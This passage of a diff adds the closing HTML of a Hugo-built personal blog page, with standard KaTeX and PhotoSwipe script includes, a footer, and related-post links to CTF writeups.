+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+        <link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"integrity="sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI&#43;WdtXRGWt2kTvGFasHpSy3SV"crossorigin="anonymous"
+            ><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"integrity="sha384-XjKyOOlGwcjNTAIQHIpgOno0Hl1YQqzUOEleOLALmuqehneUG&#43;vnGctmUb0ZY0l8"crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js"integrity="sha384-&#43;VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4&#43;/RRE05"crossorigin="anonymous"
+                defer
+                >
+            </script><script>
+    window.addEventListener("DOMContentLoaded", () => {
+	const mainArticleElement = document.querySelector(".main-article");
+        renderMathInElement(mainArticleElement, {
+            delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+                { left: "\\[", right: "\\]", display: true }
+            ],
+            ignoredClasses: ["gist"]
+        });})
+</script>
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/en/post/2024-ais3-junior-llms-writeup/">
+        
+        
+            <div class="article-image">
+                <img src="/post/2024-ais3-junior-llm%E3%84%89writeup/image.225b4d9249aa4fcd9b309107e83a78b3_hu_c65ab6a7c527d882.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 2024 AIS3 Junior LLM&#39;s Writeup"
+                        
+                        data-hash="md5-IltNkkmqT82bMJEH6Dp4sw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2024 AIS3 Junior LLM&#39;s Writeup</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/en/post/2025-ais3-pre-exams-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://hackmd.io/_uploads/HkXttAUMge.png" loading="lazy" data-key="" data-hash="https://hackmd.io/_uploads/HkXttAUMge.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025 AIS3 Pre-exam&#39;s Writeup</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/en/post/2025-ais3s-experience/">
+        
+        
+            <div class="article-image">
+                <img src="/post/2025-ais3-%E5%BF%83%E5%BE%97/image.4d8670d448e8bfa2ed4f6af6e1c789c9_hu_25d599a0823576c8.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 2025 AIS3&#39;s Experience"
+                        
+                        data-hash="md5-TYZw1Ejov6LtT2r24ceJyQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025 AIS3&#39;s Experience</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/en/post/2025-education-system-cybersecurity-attack-and-defense-inspector/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://www.taccst.moe.edu.tw/static/img/back1.jpg" loading="lazy" data-key="" data-hash="https://www.taccst.moe.edu.tw/static/img/back1.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025 Education System Cybersecurity Attack and Defense Inspector </h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 Chun-Hao Chung
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
